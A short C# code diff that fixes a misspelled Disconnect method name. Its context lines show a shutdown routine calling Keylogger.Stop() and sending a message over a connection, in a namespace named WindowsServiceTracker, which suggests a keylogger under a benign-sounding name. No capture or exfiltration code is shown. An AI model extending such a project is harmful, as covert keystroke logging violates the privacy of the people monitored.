@@ -70,7 +70,7 @@ namespace WindowsServiceTracker
             Keylogger.Stop();
             SendStringMsg("Bye!");
 
-            Disconect();
+            Disconnect();
         }
 
         private bool Connect()
@@ -90,7 +90,7 @@ namespace WindowsServiceTracker
             return false;
         }
 
-        private bool Disconect()
+        private bool Disconnect()
         {
             try
             {
